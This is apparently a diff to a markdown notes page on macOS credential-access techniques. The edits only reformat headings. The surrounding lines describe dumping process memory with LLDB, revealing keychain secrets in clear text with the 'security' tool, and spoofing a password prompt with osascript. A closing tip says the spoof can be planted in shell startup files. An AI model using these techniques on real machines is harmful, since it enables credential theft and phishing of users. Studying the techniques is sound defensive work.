@@ -1,14 +1,13 @@
 # MacOS
 ---
-# Navigation
 1. **[Process memory](#process-memory)**
 2. **[MacOS keychain](#macos-keychain)**
 3. **[Phishing and credential dialog spoofing](#phishing-and-credential-dialog-spoofing)**
 ---
-# Process memory
+## Process memory
 Apple made it more difficult to debug or dump process memory, even as root. Apple introduced a feature called **`System Integrity Protection (SIP)`** that limits what even the root user can do to the operating system.
 ```bash
-# Check if SIP is enabled
+## Check if SIP is enabled
 csrutil status
 ```
 If SIP is enabled, you cannot debug or inspect
@@ -23,9 +22,9 @@ But the good news is that even if SIP is enabled, you can still debug certain pr
 After finding a running process not covered by SIP, attach the LLDB debugger to it.
 ```bash
 lldp -p <pid>
-# Attach process
+## Attach process
 (lldp) process attach --pid <pid>
-# Dump process memory
+## Dump process memory
 (lldp) process save-core
 ```
 > You can inject code into memory:
@@ -34,7 +33,7 @@ lldp -p <pid>
 [Linux#2- Decrypting TLS traffic using TLS key logging Not working on latest firefox and chrome](linux.md%25232-%2520Decrypting%2520TLS%2520traffic%2520using%2520TLS%2520key%2520logging%2520Not%2520working%2520on%2520latest%2520firefox%2520and%2520chrome)
 
 ---
-# MacOS keychain
+## MacOS keychain
 Apple introduced a consistent requirement for users to enter their password interactively whenever the Keychain is accessed to decrypt secrets, which makes it more difficult for malware to gain access. The tool to interact with Keychains is called  **`security`**.
 Depending on the **macOS version** of the host, the following commands might allow you to get access to encrypted credentials. The  **`-d`**  option shows the **clear text** credentials:
 
@@ -58,7 +57,7 @@ This will prompt for the user's password to unlock the Keychain (if it is locked
 ![keychainpopup2](attachments/keychainpopup2.png)
 
 ---
-# Phishing and credential dialog spoofing
+## Phishing and credential dialog spoofing
 ## 1- Spoofing a credential prompt using osascript
 ```bash
 osascript -e 'display notification "Hello World!"'
@@ -80,5 +79,3 @@ echo $PWD_SPOOF
 
 > **Note:**
 >  One of the ways to deploy this is by putting it in ~/.profile or ~/.bashrc or by sending it in a file.
-
-
